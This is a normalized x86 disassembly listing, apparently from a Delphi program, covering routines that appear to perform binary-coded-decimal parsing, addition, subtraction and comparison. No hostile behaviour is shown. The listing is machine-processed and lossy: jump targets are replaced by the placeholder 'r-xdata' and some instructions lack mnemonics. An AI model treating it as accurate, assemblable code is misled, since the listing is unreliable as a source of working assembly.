xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47a775
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax esi
call sub_4045e0
call sub_47a520
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40452c
je r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
mov ebx [ ebp - 0x4 ]
add ebx 0x2
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402da4
jmp r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a77c
lea eax [ ebp - 0xc ]
call sub_404120
retn
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x6 ] 0x0
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404308
mov eax [ ebp - 0xc ]
mov edx esi
call sub_404724
mov edi eax
mov eax esi
call sub_4045e0
mov ebx eax
jmp r-xdata
mov al [ ebx ]
mov edx eax
and edx 0xff
bt [ rw-data ] edx
jb r-xdata
inc ebx
test di di
jbe r-xdata
cmp al 0x30
je r-xdata
dec edi
mov eax ebx
call sub_408c10
lea esi [ ebx + eax - 0x1 ]
jmp r-xdata
mov al [ esi ]
and eax 0xff
bt [ rw-data ] eax
jb r-xdata
mov [ esi ] 0x0
dec esi
cmp [ ebx ] 0x2d
jne r-xdata
mov al [ ebx ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x6 ] 0x1
test di di
jbe r-xdata
inc ebx
cmp al 0x2b
jne r-xdata
dec edi
mov eax ebx
call sub_408c10
mov [ ebp - 0x8 ] ax
cmp [ ebp - 0x8 ] 0x40
jbe r-xdata
inc ebx
test di di
jbe r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax esi
xor ecx ecx
mov edx 0x20
call sub_402da4
cmp [ ebx ] 0x30
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
test di di
jbe r-xdata
dec edi
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
push esi
push ebx
mov ax [ ebp - 0x8 ]
push eax
call sub_47a4d4
jmp r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
jmp r-xdata
cmp di 0x40
ja r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
cmp [ ebp - 0x6 ] 0x0
je r-xdata
mov al [ ebp - 0x8 ]
mov edx eax
dec edx
mov ecx [ ebp - 0x4 ]
mov [ ecx ] dl
cmp [ ebp - 0x6 ] 0x0
je r-xdata
test di di
jbe r-xdata
mov [ ebp - 0x8 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x80
jmp r-xdata
mov edx edi
sub al dl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
mov edx edi
sub al dl
add al 0x80
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
sub_47a794
push ebp
mov ebp esp
push ecx
push esi
push ebx
mov esi [ ebp + 0xc ]
mov cx [ ebp + 0x8 ]
cld
mov [ ebp - 0x2 ] cx
pop ebx
pop esi
mov ax [ ebp - 0x2 ]
pop ecx
pop ebp
retn 0x8
lodsb [ esi ]
cmp al 0x0
jne r-xdata
shr al 0x4
cmp al 0x0
jne r-xdata
sub cx 0x1
cmp cx 0x0
je r-xdata
sub cx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_47a7d8
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
sub dl al
call sub_47a398
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
sub dl al
call sub_47a398
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_47a890
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
add dl al
call sub_47a388
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
add dl al
call sub_47a388
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_47a948
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push edx
mov cx [ ebp + 0xc ]
mov dx [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x0
cld
cmp dx 0x0
jle r-xdata
lodsb [ esi ]
mov ah [ edi ]
inc edi
cmp al ah
jne r-xdata
pop edx
pop ebx
pop edi
pop esi
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x10
mov ah [ edi ]
inc edi
sub dx 0x2
cmp ah 0x0
je r-xdata
mov bl ah
mov ah al
shr ah 0x4
mov bh bl
shr bh 0x4
cmp bh ah
jne r-xdata
sub cx 0x1
sub dx 0x1
cmp cx 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp bh ah
ja r-xdata
cmp cx 0x0
je r-xdata
sub cx 0x1
sub dx 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov ah al
mov bh bl
and ah 0xf
and bh 0xf
cmp cx 0x0
je r-xdata
sub_47a9fc
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov esi eax
xor edi edi
mov ebp edx
mov eax [ esi ]
mov dl [ eax ]
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp edi eax
jl r-xdata
mov al [ ebp ]
and dl 0xf
shl edx 0x4
xor ecx ecx
mov cl al
shr ecx 0x4
or dl cl
mov ecx [ esi ]
mov [ ecx ] dl
mov edx eax
inc [ esi ]
inc ebp
add edi 0x2
pop edx
pop ebp
pop edi
pop esi
retn
sub_47aa3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov esi edx
mov edi eax
mov [ ebp - 0x3 ] 0x1
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jne r-xdata
mov al [ edi + 0x1 ]
test al 0x80
setne [ ebp - 0xb ]
and al 0x3f
and eax 0xff
mov [ ebp - 0xa ] ax
mov al [ ebp - 0x2 ]
mov [ esi ] al
mov al [ ebp + 0x8 ]
mov [ esi + 0x1 ] al
lea eax [ edi + 0x2 ]
mov [ ebp - 0x8 ] eax
lea ebx [ esi + 0x2 ]
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402da4
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jbe r-xdata
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
cmp ax [ ebp + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov al [ ebp - 0xa ]
mov dl [ edi ]
sub dl al
push edx
push eax
mov al [ ebp - 0x2 ]
mov dl [ ebp + 0x8 ]
and dl 0x3f
sub al dl
push eax
mov al [ ebp + 0x8 ]
and al 0x3f
push eax
push ebx
call sub_47a3f0
cmp [ ebp - 0xb ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor eax eax
mov al [ edi ]
push eax
call sub_47a794
cmp ax [ ebp - 0x2 ]
jbe r-xdata
push esi
mov eax edi
mov edi esi
mov esi eax
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
xor edx edx
mov dl [ esi ]
mov eax edx
shr eax 0x1
and edx 0x1
cmp edx 0x1
jne r-xdata
test [ esi + 0x1 ] 0x80
jne r-xdata
mov [ ebp - 0x3 ] 0x0
jmp r-xdata
movsx eax ax
cmp eax 0x1f
jg r-xdata
inc eax
mov al [ esi + 0x1 ]
call sub_47a9f0
mov [ esi + 0x1 ] al
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_47ab68
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
mov al [ esi ]
xor edx edx
mov dl al
cmp edi edx
jl r-xdata
mov [ ebx ] al
mov al [ esi + 0x1 ]
mov [ ebx + 0x1 ] al
lea ebp [ ebx + 0x2 ]
mov eax ebp
xor ecx ecx
mov edx 0x20
call sub_402da4
lea eax [ esi + 0x2 ]
mov esi eax
jmp r-xdata
mov edi ebx
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp edi eax
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47b630
movzx eax ax
xor edx edx
mov dl [ ebx ]
add eax edx
add eax 0x2
shr eax 0x1
cmp eax 0x20
jle r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx ebp
mov ecx esi
xchg ecx eax
call sub_4029b0
mov eax 0x20
sub [ ebx ] 0x2
inc esi
sub_47abe8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx edx
mov edi ebx
lea esi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
mov al [ ebp - 0x26 ]
and eax 0x1
test eax eax
je r-xdata
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov al [ ebx ]
shr eax 0x1
cmp eax 0x1f
jg r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ ebx + 0x2 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov dl [ ebp - 0x26 ]
inc edx
mov [ ebx ] dl
lea edx [ ebp - 0x4 ]
mov cl [ ebp - 0x26 ]
xchg edx eax
call sub_47a9fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov [ edx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_47ac64
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
lea edx [ ebp - 0x26 ]
mov eax ebx
call sub_47abe8
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_47abe8
cmp [ ebp - 0x26 ] 0x20
ja r-xdata
mov eax esi
call sub_47ab4c
push eax
mov eax ebx
call sub_47ab4c
pop edx
call sub_42e3c8
mov ebx eax
xor eax eax
mov al [ ebp - 0x26 ]
cmp bx ax
jae r-xdata
cmp [ ebp - 0x48 ] 0x20
jbe r-xdata
xor eax eax
mov al [ ebp - 0x48 ]
cmp bx ax
jae r-xdata
mov ebx eax
xor edx edx
mov dl [ ebp - 0x48 ]
xor eax eax
mov al [ ebp - 0x26 ]
call sub_42e3c8
mov ebx eax
lea eax [ ebp - 0x48 ]
call sub_47b630
movzx eax ax
push eax
lea eax [ ebp - 0x26 ]
call sub_47b630
movzx eax ax
pop edx
call sub_42e3c8
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0x6c ]
movzx esi bx
mov edx esi
lea eax [ ebp - 0x26 ]
call sub_47ab68
push esi
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x6c ]
mov edx esi
lea eax [ ebp - 0x48 ]
call sub_47ab68
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x48 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx eax
cmp bx 0x40
jae r-xdata
push esi
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x26 ]
mov ecx ebx
call sub_47aa3c
push esi
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x48 ]
mov ecx ebx
call sub_47aa3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x26 ]
call sub_47b630
movzx eax ax
xor edx edx
mov dl [ ebp - 0x26 ]
sub edx eax
movzx edi bx
movzx eax si
sub edi eax
cmp edx edi
jg r-xdata
add bx 0x2
lea eax [ ebp - 0x48 ]
call sub_47b630
movzx eax ax
xor edx edx
mov dl [ ebp - 0x48 ]
sub edx eax
cmp edi edx
jl r-xdata
sub_47ad98
push ebx
push esi
push edi
push ebp
add esp 0xffffffb8
mov esi edx
mov edi eax
mov al [ edi + 0x1 ]
and al 0x80
mov dl [ esi + 0x1 ]
and dl 0x80
cmp al dl
je r-xdata
test al al
setne [ esp + 0x1 ]
lea ebp [ edi + 0x2 ]
lea ebx [ esi + 0x2 ]
push ebp
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ edi ]
sub dx ax
push edx
call sub_47a794
mov [ esp ] al
push ebx
mov al [ esi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ esi ]
sub dx ax
push edx
call sub_47a794
cmp al [ esp ]
je r-xdata
test al al
je r-xdata
lea eax [ esp + 0x24 ]
push eax
push 0x0
lea ecx [ esp + 0xa ]
mov edx esi
mov eax edi
call sub_47ac64
lea ebp [ esp + 0x4 ]
lea ebx [ esp + 0x26 ]
push ebp
push ebx
xor eax eax
mov al [ esp + 0xa ]
push eax
xor eax eax
mov al [ esp + 0x30 ]
push eax
call sub_47a948
cmp al [ esp ]
jge r-xdata
mov eax 0x1
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
add esp 0x48
pop ebp
pop edi
pop esi
pop ebx
retn
neg eax
or eax 0xffffffff
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esp + 0x1 ] 0x0
je r-xdata
sub_47ae60
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi ecx
mov ebx eax
push esi
mov esi edx
lea edi [ esp + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
call sub_47a9f0
mov [ esp + 0x1 ] al
mov ecx esi
mov edx esp
mov eax ebx
call sub_47b1bc
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_47ae9c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
mov eax [ ebp - 0x8 ]
call sub_4045d0
xor eax eax
push ebp
push sub_47af85
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4045e0
cmp [ eax ] 0x2d
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4045e0
cmp [ eax ] 0x2d
jne r-xdata
inc ebx
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404640
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_479b8c
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
call sub_478d1c
push esi
mov edi esi
lea esi [ ebp - 0x30 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
and ebx 0x80000001
jns r-xdata
inc ebx
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_404640
test ebx ebx
je r-xdata
dec ebx
or ebx 0xfffffffe
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47af8c
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404144
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_47af94
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403b24#7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_47b4ec
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_47b4ec
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_47ae9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47aff7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
sub_47b000
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
mov eax [ ebp - 0x8 ]
call sub_4045d0
xor eax eax
push ebp
push sub_47b136
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40452c
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x10 ]
call sub_4784d8
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4045e0
cmp [ eax ] 0x2d
jne r-xdata
mov bl 0xa
xor edi edi
mov bl [ esi + 0x1 ]
and bl 0x3f
test bl bl
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4045e0
cmp [ eax ] 0x2d
jne r-xdata
inc edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404640
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47a26c
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
xor edx edx
mov dl bl
call sub_478dd0
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
call sub_478d1c
push esi
push edi
mov edi esi
lea esi [ ebp - 0x38 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop edi
pop esi
and edi 0x80000001
jns r-xdata
inc edi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_404640
test edi edi
je r-xdata
dec edi
or edi 0xfffffffe
inc edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b13d
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404144
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_47b150
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b1ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_47b4ec
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_47b4ec
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_47b000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b1b3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
sub_47b1bc
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov esi ecx
mov [ esp ] edx
mov ebx eax
lea eax [ esp + 0x2f ]
push eax
push 0x1
lea ecx [ esp + 0x15 ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_47ac64
movzx ebp [ esp + 0xd ]
movzx edi [ esp + 0xe ]
test [ ebx + 0x1 ] 0x80
setne al
mov ebx eax
mov eax [ esp ]
test [ eax + 0x1 ] 0x80
setne [ esp + 0xc ]
mov eax ebp
mov [ esi ] al
cmp bl [ esp + 0xc ]
je r-xdata
mov eax edi
mov [ esi + 0x1 ] al
jmp r-xdata
mov al [ esp + 0xe ]
and al 0x3f
mov dl [ esp + 0x30 ]
and dl 0x3f
cmp al dl
jb r-xdata
lea eax [ esp + 0xf ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x31 ]
mov [ esp + 0x8 ] eax
lea edi [ esi + 0x2 ]
mov eax edi
xor ecx ecx
mov edx 0x20
call sub_402da4
cmp bl [ esp + 0xc ]
jne r-xdata
mov eax edi
call sub_47a9f0
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
push ebp
call sub_47a794
movzx ebx ax
mov eax [ esp + 0x8 ]
push eax
push ebp
call sub_47a794
movzx eax ax
cmp eax ebx
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_47a890
jmp r-xdata
cmp ebx eax
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_47a7d8
jmp r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push ebp
push ebp
call sub_47a948
test eax eax
jl r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_47a7d8
mov al [ esi + 0x1 ]
call sub_47a9f0
mov [ esi + 0x1 ] al
jmp r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_47a7d8
mov al [ esi + 0x1 ]
call sub_47a9f0
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_47a7d8
jmp r-xdata
sub_47b328
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
movsx edx [ edx - 0x9 ]
cmp eax edx
je r-xdata
test bl bl
ja r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebx + 0x30 ]
call sub_47b30c
pop ecx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x11 ]
call sub_47b30c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov al 0x30
call sub_47b30c
pop ecx
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
pop ebx
pop ebp
retn
sub_47b3a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x14 ] dx
mov edi eax
movsx eax [ ebp - 0x14 ]
add eax 0x3
call sub_408084
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_47b493
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
movsx esi [ ebp - 0x14 ]
cmp esi [ ebp - 0x10 ]
jg r-xdata
push ebp
xor eax eax
mov al [ edi + ebx ]
shr eax 0x4
call sub_47b328
pop ecx
cmp esi [ ebp - 0x10 ]
jle r-xdata
jmp r-xdata
inc ebx
push ebp
mov al [ edi + ebx ]
and al 0xf
call sub_47b328
pop ecx
cmp [ ebp - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
movsx eax [ ebp - 0x9 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_404210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b49a
movsx edx [ ebp - 0x14 ]
add edx 0x2
mov eax [ ebp - 0x18 ]
call sub_4027d4
retn
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x1
jg r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x30
jne r-xdata
dec [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
sub_47b49a
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_404174
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_40442c
sub_47b4ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47b5eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx ]
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x10 ]
call sub_4784f0
jmp r-xdata
cmp al 0x40
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b5f2
lea eax [ ebp - 0x10 ]
call sub_404120
retn
mov dl [ ebx + 0x1 ]
test dl 0x80
setne [ ebp - 0x9 ]
mov esi eax
and esi 0xff
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x8 ] eax
and dl 0x3f
test dl dl
jbe r-xdata
mov edi esi
inc edi
mov eax esi
mov dl [ ebx + 0x1 ]
and dl 0x3f
sub al dl
movsx edi al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_40452c
je r-xdata
sub al 0x3
jne r-xdata
mov al [ ebp - 0x9 ]
push eax
mov al [ ebx + 0x1 ]
and al 0x3f
and eax 0xff
cmp esi eax
sete al
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_47b3a4
